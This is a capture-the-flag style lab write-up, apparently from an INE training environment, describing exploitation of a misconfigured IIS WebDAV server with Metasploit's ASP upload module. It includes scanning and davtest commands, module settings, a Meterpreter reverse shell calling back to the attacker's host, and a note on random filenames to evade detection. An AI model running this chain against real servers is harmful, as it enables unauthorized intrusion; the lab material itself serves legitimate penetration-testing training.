\chapter{Lab: IIS WebDAV Exploitation with Metasploit}
\label{lab:webdav_metasploit}

\begin{notebox}[Lab objective]
Exploit a misconfigured Microsoft IIS WebDAV endpoint using Metasploit's
\ic{iis\_webdav\_upload\_asp} module to upload an ASP Meterpreter payload,
gain a reverse shell session, and retrieve the flag.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Environment}
\begin{itemize}
  \item \textbf{Attacker:} Kali Linux (INE lab environment)
  \item \textbf{Target:} \ic{demo.ine.local} --- \ic{10.2.28.172}
  \item \textbf{Tools:} \ic{ping}, \ic{nmap}, \ic{davtest}, Metasploit Framework
  \item \textbf{Credentials:} \ic{bob:password\_123321} (provided by lab)
\end{itemize}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 1 --- Confirm Host is Reachable}

\begin{termbox}
ping -c 1 demo.ine.local
\end{termbox}

Host confirmed alive. IP noted as \ic{10.2.28.172}.

\screenshot{assets/images/Screenshot_2026-04-12_at_5.05.40_PM.png}{Ping confirming demo.ine.local is reachable}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 2 --- Initial Scan}

\begin{termbox}
nmap -f 10.2.28.172
\end{termbox}

Used packet fragmentation (\ic{-f}) for the initial broad scan to quickly map
the attack surface. Found HTTP on port 80. SMB and RDP also visible but the lab
context is IIS + WebDAV so I focused on port 80.

\screenshot{assets/images/Screenshot_2026-04-12_at_5.17.34_PM.png}{Initial fragmented scan results showing open ports}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 3 --- HTTP Enumeration}

\begin{termbox}
nmap --script http-enum -sV -p 80 10.2.28.172
\end{termbox}

\textbf{Key findings:}
\begin{itemize}
  \item Microsoft IIS 10.0 confirmed on port 80
  \item \ic{/webdav/} returning \textbf{401 Unauthorized} --- endpoint exists,
        requires credentials
\end{itemize}

\screenshot{assets/images/Screenshot_2026-04-12_at_6.15.32_PM.png}{http-enum revealing /webdav/ endpoint with 401 response}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 4 --- Validate WebDAV Attack Path with davtest}

\begin{termbox}
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
\end{termbox}

\textbf{What I confirmed:}
\begin{itemize}
  \item File upload via PUT: working
  \item ASP file execution: confirmed
  \item Attack path validated --- proceed with Metasploit ASP upload module
\end{itemize}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 5 --- Start Metasploit and Find the Module}

\begin{termbox}
service postgresql start && msfconsole

# Search for IIS WebDAV upload modules
search iis upload
# Selected: exploit/windows/iis/iis_webdav_upload_asp (index 1)

use 1
show options
\end{termbox}

\screenshot{assets/images/Screenshot_2026-04-13_at_2.18.45_PM.png}{Metasploit search results showing iis\_webdav\_upload\_asp module}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 6 --- Configure the Module}

\begin{termbox}
set RHOST 10.2.28.172
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp    # Random filename to avoid detection
# LHOST was already set from earlier: 10.10.41.14
\end{termbox}

\textbf{Parameter rationale:}
\begin{itemize}
  \item \ic{RHOST} --- target IP from the nmap phase
  \item \ic{HttpUsername/HttpPassword} --- credentials confirmed working with davtest
  \item \ic{PATH} --- upload path within the WebDAV directory; \ic{\%RAND\%}
        generates a random filename
  \item \ic{LHOST} --- my Kali VPN interface (must be VPN, not loopback)
\end{itemize}

\screenshot{assets/images/Screenshot_2026-04-13_at_2.28.42_PM.png}{Module options configured with credentials, RHOST, and PATH}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 7 --- Execute the Exploit}

\begin{termbox}
exploit
\end{termbox}

\textbf{What happened step by step:}
\begin{enumerate}
  \item Reverse TCP handler started on \ic{10.10.41.14:1234}
  \item Module checked for existing file at the random path
  \item Uploaded 612,581 bytes to \ic{/webdav/metasploit73788480.txt}
  \item Moved the file to \ic{metasploit73788480.asp}
  \item Executed the ASP payload by requesting the URL
  \item Stage sent (176,198 bytes)
  \item \textbf{Meterpreter session 1 opened} at \ic{10.2.28.172:49836}
\end{enumerate}

\screenshot{assets/images/Screenshot_2026-04-13_at_2.31.44_PM.png}{Exploit running --- upload, rename, execute, and Meterpreter session opened}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 8 --- Post-Exploitation and Flag}

\begin{termbox}
meterpreter > cd /
meterpreter > ls
# flag.txt visible at C:\
meterpreter > cat flag.txt
\end{termbox}

\screenshot{assets/images/Screenshot_2026-04-13_at_10.15.16_PM.png}{Meterpreter session listing C:\ with flag.txt visible}

\screenshot{assets/images/Screenshot_2026-04-13_at_10.19.55_PM.png}{cat flag.txt output --- flag retrieved and lab objective complete}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Result}

Flag retrieved. 1 of 1 flags captured. Lab complete.

% ─────────────────────────────────────────────────────────────────────────────
\section*{Key Learning}

\begin{takebox}
\begin{itemize}
  \item The Metasploit module handles the entire chain automatically: upload,
        rename from \ic{.txt} to \ic{.asp}, trigger execution, and catch the
        reverse shell. Understanding what it does manually (Lab~\ref{lab:webdav_manual})
        makes this module make sense.
  \item davtest before the module confirmed the attack path was viable. Running
        the exploit blind wastes time and creates noise on the server.
  \item The \ic{\%RAND\%} in the path means each run uses a different filename,
        which helps evade signature-based detection.
  \item LHOST must be the VPN interface. If the target cannot reach back to the
        attacker, the session never opens.
\end{itemize}
\end{takebox}
